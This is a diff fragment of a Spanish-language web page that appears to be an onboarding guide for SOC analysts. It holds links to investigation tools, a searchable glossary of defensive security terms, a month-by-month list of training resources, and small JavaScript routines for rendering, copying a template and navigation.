+ {g:'Entender lo que estás viendo',i:[['CyberChef','https://gchq.github.io/CyberChef/','Decodifica Base64, PowerShell codificado (UTF-16LE), XOR, URL encoding. Tu navaja suiza.'],['LOLBAS','https://lolbas-project.github.io','Qué binarios de Windows se pueden abusar y cómo.'],['GTFOBins','https://gtfobins.github.io','Lo mismo para Linux.'],['MITRE ATT&CK','https://attack.mitre.org','Qué es cada técnica, ejemplos y cómo detectarla.'],['EchoTrail','https://www.echotrail.io','Qué tan común es un proceso y quién suele ser su padre.'],['Ultimate Windows Security','https://www.ultimatewindowssecurity.com/securitylog/encyclopedia/','Enciclopedia de eventos de Windows, campo por campo.'],['explainshell','https://explainshell.com','Desarma comandos de Linux parámetro por parámetro.']]}
+];
+$('#tools').innerHTML=tools.map(g=>`<div class="tool-group"><h3>${esc(g.g)}</h3>${g.i.map(t=>`<div class="tool"><a href="${t[1]}" target="_blank" rel="noopener">${esc(t[0])}</a><span>${esc(t[2])}</span></div>`).join('')}</div>`).join('');
+
+/* ---------- GLOSARIO ---------- */
+const gloss=[
+ ['Alerta','Aviso de que una regla detectó algo. Es una pregunta, no un veredicto.'],
+ ['Incidente','Grupo de alertas relacionadas que el XDR o el SIEM juntó como una sola historia.'],
+ ['Triage','Primera revisión para decidir si algo es real, qué tan grave es y qué sigue.'],
+ ['IOC','Indicador de compromiso: hash, IP, dominio, URL. Datos concretos que puedes buscar o bloquear.'],
+ ['IOA','Indicador de ataque: un comportamiento (ej. Office lanzando PowerShell), no un dato fijo. Falcon los usa mucho.'],
+ ['TTP','Tácticas, técnicas y procedimientos. Cómo opera un atacante.'],
+ ['MITRE ATT&CK','Catálogo público de técnicas de ataque. Cada una tiene un ID como T1059.'],
+ ['Verdadero positivo (TP)','La detección acertó y la actividad es maliciosa.'],
+ ['Falso positivo (FP)','La detección se equivocó; no hay lo que la regla buscaba.'],
+ ['TP benigno','La detección acertó, pero la actividad es legítima y autorizada.'],
+ ['Escalamiento','Pasar el caso al siguiente nivel con tu evidencia documentada.'],
+ ['Contención','Acciones para frenar el daño: aislar un equipo, deshabilitar una cuenta, bloquear un IOC.'],
+ ['Hash','Huella única de un archivo (MD5, SHA1, SHA256). Usa SHA256 cuando puedas.'],
+ ['LOLBin','Binario legítimo del sistema usado con fines maliciosos (certutil, mshta, rundll32).'],
+ ['C2','Comando y control: el servidor del atacante desde donde manda órdenes al malware.'],
+ ['Beaconing','Conexiones periódicas del malware a su C2, como un latido.'],
+ ['Payload','La carga útil: la parte que hace el daño.'],
+ ['Dropper / loader','Primer archivo que baja o carga el malware real.'],
+ ['Persistencia','Mecanismo para que el malware sobreviva a reinicios.'],
+ ['Movimiento lateral','Saltar de un equipo comprometido a otros dentro de la red.'],
+ ['Árbol de procesos','La genealogía: qué proceso lanzó a cuál. Lo más valioso de un EDR.'],
+ ['CGO','Causality Group Owner en Cortex: el proceso raíz de una cadena de actividad.'],
+ ['RTR','Real Time Response de Falcon: una terminal remota en el equipo.'],
+ ['Live Response','La terminal remota de Defender for Endpoint.'],
+ ['Advanced hunting','Búsqueda con consultas sobre la telemetría. KQL en Defender, CQL en Falcon, XQL en Cortex, SPL en Splunk.'],
+ ['Sandbox','Entorno aislado donde se ejecuta un archivo para ver qué hace.'],
+ ['Defang','Desactivar un IOC para que no sea clickeable: hxxp, [.] en lugar de punto.'],
+ ['Telemetría','Los eventos que manda el agente: procesos, red, archivos, registro.'],
+ ['Severidad vs. confianza','Severidad es qué tan grave sería; confianza es qué tan seguro está el producto de que pasó.'],
+ ['Detected vs. Prevented','Detectado solo avisa. Prevenido o bloqueado significa que la herramienta lo detuvo.'],
+ ['Exclusión / tuning','Ajustar una regla para que no salte con actividad conocida. Siempre acotado y aprobado.'],
+ ['Runbook / playbook','Pasos acordados para responder a un tipo de alerta o cliente.'],
+ ['MDR','Managed Detection and Response: el servicio de monitoreo y respuesta que damos a los clientes.'],
+ ['SOAR','Plataforma que automatiza pasos de respuesta (enriquecer, bloquear, abrir tickets).'],
+ ['Pivotear','Usar un dato (una IP, un usuario) para encontrar más actividad relacionada.'],
+ ['BEC','Business Email Compromise: fraude usando una cuenta de correo comprometida, casi siempre para desviar pagos.'],
+ ['Password spray','Probar pocas contraseñas comunes contra muchas cuentas para no bloquearlas.'],
+ ['MFA fatigue','Mandar pushes de MFA una y otra vez hasta que el usuario acepta por cansancio.']
+];
+function renderGloss(){
+  const q=($('#gsearch').value||'').toLowerCase().trim();
+  const l=gloss.filter(g=>!q||(g[0]+' '+g[1]).toLowerCase().includes(q));
+  $('#gloss').innerHTML=l.length?l.map(g=>`<div class="term"><dt>${esc(g[0])}</dt><dd>${esc(g[1])}</dd></div>`).join(''):'<p class="empty">Sin resultados.</p>';
+}
+$('#gsearch').addEventListener('input',renderGloss);renderGloss();
+
+/* ---------- APRENDER ---------- */
+const learn=[
+ {c:'Primer mes',i:[['TryHackMe · SOC Level 1','https://tryhackme.com/path/outline/soclevel1','Ruta guiada desde cero: fundamentos, phishing, SIEM, endpoint.','Gratis / pago'],['LetsDefend','https://letsdefend.io','Simula una consola de SOC con alertas que tienes que cerrar. Muy parecido al día a día.','Gratis / pago'],['MITRE ATT&CK','https://attack.mitre.org','Lee las técnicas que veas en tus alertas. Una por día.','Gratis'],['Must Learn KQL','https://github.com/rod-trent/MustLearnKQL','Serie para aprender KQL desde cero.','Gratis']]},
+ {c:'Meses 2 a 4',i:[['Blue Team Labs Online','https://blueteamlabs.online','Retos de investigación con evidencia real: logs, PCAP, memoria.','Gratis / pago'],['CyberDefenders','https://cyberdefenders.org','Laboratorios de DFIR y threat hunting por niveles.','Gratis / pago'],['Microsoft Learn · SC-200','https://learn.microsoft.com/en-us/credentials/certifications/security-operations-analyst/','Ruta oficial de Defender XDR y Sentinel. Buena base para certificarte.','Gratis (examen de pago)'],['Palo Alto Beacon','https://beacon.paloaltonetworks.com','Cursos de Cortex XDR y XQL de Palo Alto.','Gratis']]},
+ {c:'Cuando ya vueles solo',i:[['The DFIR Report','https://thedfirreport.com','Intrusiones reales contadas paso a paso. Lee una por semana y piensa qué alerta habría saltado.','Gratis'],['Red Canary Threat Detection Report','https://redcanary.com/threat-detection-report/','Las técnicas más vistas del año y cómo detectarlas.','Gratis'],['SANS Posters','https://www.sans.org/posters/','"Hunt Evil" y "Windows Forensic Analysis" son para tenerlos impresos.','Gratis'],['Atomic Red Team','https://github.com/redcanaryco/atomic-red-team','Pruebas para generar técnicas en un laboratorio propio y ver cómo se ven en el EDR.','Gratis']]}
+];
+$('#learn').innerHTML=learn.map(c=>`<div class="learn-col"><h3>${esc(c.c)}</h3>${c.i.map(r=>`<div class="res"><a href="${r[1]}" target="_blank" rel="noopener">${esc(r[0])}</a><p>${esc(r[2])}</p><span class="lvl">${esc(r[3])}</span></div>`).join('')}</div>`).join('');
+
+/* ---------- KIT ---------- */
+$('#copyTpl').addEventListener('click',async()=>{
+  const t=$('#tpl');
+  try{await navigator.clipboard.writeText(t.value);$('#tplToast').textContent='Copiada'}
+  catch(e){t.select();$('#tplToast').textContent='Seleccionada, copia con Ctrl+C'}
+  setTimeout(()=>$('#tplToast').textContent='',2000);
+});
+
+/* ---------- NAV ---------- */
+const links=[...document.querySelectorAll('#nav a')];
+const secs=links.map(a=>document.querySelector(a.getAttribute('href')));
+function onScroll(){
+  let cur=secs[0];secs.forEach(s=>{if(s&&s.getBoundingClientRect().top<120)cur=s});
+  links.forEach(a=>a.classList.toggle('on',a.getAttribute('href')==='#'+cur.id));
+}
+addEventListener('scroll',onScroll,{passive:true});onScroll();
+const h=location.hash.replace('#','');
+if(/^[A-Za-z0-9._~-]+$/.test(h)){const el=document.getElementById(h);if(el)setTimeout(()=>el.scrollIntoView(),50)}
+</script>
+
+</body>
+</html>
